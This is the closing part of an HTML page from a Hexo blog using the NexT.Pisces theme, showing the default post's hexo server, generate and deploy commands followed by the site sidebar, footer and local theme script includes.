<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/x.jpg"
               alt="cuteme" />
          <p class="site-author-name" itemprop="name">cuteme</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">7</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              
                <span class="site-state-item-count">9</span>
                <span class="site-state-item-name">标签</span>
              
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cuteme</span>
</div>

<div class="powered-by">
  a404
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  

</body>
</html>
